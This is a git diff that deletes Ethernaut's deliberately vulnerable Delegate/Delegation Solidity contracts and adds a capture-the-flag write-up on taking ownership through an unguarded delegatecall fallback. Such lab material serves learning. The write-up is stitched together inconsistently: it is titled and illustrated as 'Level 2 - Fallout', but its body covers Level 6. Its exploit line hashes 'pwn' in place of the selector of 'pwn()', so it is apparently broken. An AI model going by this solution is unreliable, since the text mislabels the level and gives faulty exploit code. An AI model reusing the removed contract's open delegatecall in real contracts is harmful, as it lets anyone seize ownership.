@@ -1,31 +1,56 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<div align="center">
 
-contract Delegate {
-    address public owner;
+<img src="../assets/levels/2-fallout.webp" width="600px"/>
+<br><br>
+<h1><strong>Ethernaut Level 2 - Fallout</strong></h1>
 
-    constructor(address _owner) {
-        owner = _owner;
+</div>
+
+## Table of Contents
+
+- [Table of Contents](#table-of-contents)
+- [Objectif](#objectif)
+- [The hack](#the-hack)
+- [Level 6 - Delegate](#level-6---delegate)
+- [Solution](#solution)
+- [Takeaway](#takeaway)
+
+## Objectif
+
+<img src="../assets/requirements/2-fallout-requirements.webp" width="800px"/>
+
+## The hack
+
+## Level 6 - Delegate
+
+Requires taking advantage of the delegate call being used in the Delegation contract
+
+## Solution
+
+This is the fallback function in the Delegation contract
+
+```
+fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
     }
+```
 
-    function pwn() public {
-        owner = msg.sender;
-    }
-}
+`delegate` is the contract we need to take control of,
+Hence here we do
 
-contract Delegation {
-    address public owner;
-    Delegate delegate;
+```
+contract.sendTransaction({data: web3.utils.keccak256("pwn")})
+```
 
-    constructor(address _delegateAddress) {
-        delegate = Delegate(_delegateAddress);
-        owner = msg.sender;
-    }
+Thus calling the `Delegation` contract's fallback which delegates to the `Delegate` contract, calling its `pwn` function, making us the owner.
 
-    fallback() external {
-        (bool result, ) = address(delegate).delegatecall(msg.data);
-        if (result) {
-            this;
-        }
-    }
-}
+## Takeaway
+
+Usage of delegate call(libs and proxies) and its importance to get right - parity hack explored the incorrect use of delegate call
+
+<div align="center">
+<br>
+<h2>🎉 Level completed! 🎉</h2>
+</div>
